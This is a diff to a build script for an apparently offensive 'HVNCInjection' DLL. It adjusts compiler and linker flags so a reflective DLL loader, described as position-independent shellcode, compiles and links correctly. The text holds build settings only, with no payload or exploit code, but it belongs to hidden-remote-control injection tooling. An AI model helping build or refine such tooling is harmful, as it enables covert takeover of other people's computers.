@@ -187,14 +187,16 @@ CFLAGS="$CFLAGS -DHVNCInjection_EXPORTS -DWIN_X64"
 CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR"
 CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
 CFLAGS="$CFLAGS -fno-stack-protector"
-CFLAGS="$CFLAGS -fno-asynchronous-unwind-tables"
 CFLAGS="$CFLAGS -I$SRC_DIR"
 if [ -n "${MINHOOK_INC:-}" ]; then
   CFLAGS="$CFLAGS $MINHOOK_INC"
 fi
 
+# ReflectiveLoader is position-independent shellcode: strip .eh_frame but keep .pdata
+LOADER_CFLAGS="$CFLAGS -fno-asynchronous-unwind-tables"
+
 echo "Compiling ReflectiveLoader.c ..."
-"$CC" -c $CFLAGS -o "$SRC_DIR/ReflectiveLoader.o" "$SRC_DIR/ReflectiveLoader.c"
+"$CC" -c $LOADER_CFLAGS -o "$SRC_DIR/ReflectiveLoader.o" "$SRC_DIR/ReflectiveLoader.c"
 
 echo "Compiling ReflectiveDll.c ..."
 "$CC" -c $CFLAGS -o "$SRC_DIR/ReflectiveDll.o" "$SRC_DIR/ReflectiveDll.c"
@@ -214,7 +216,6 @@ fi
 
 "$CC" -shared -o "$OUT_DIR/$DLL_NAME" $LINK_OBJS $LINK_LIBS \
   -Wl,--entry,DllMain \
-  -Wl,--no-seh \
   -Wl,--disable-runtime-pseudo-reloc \
   -fno-stack-protector \
   -s
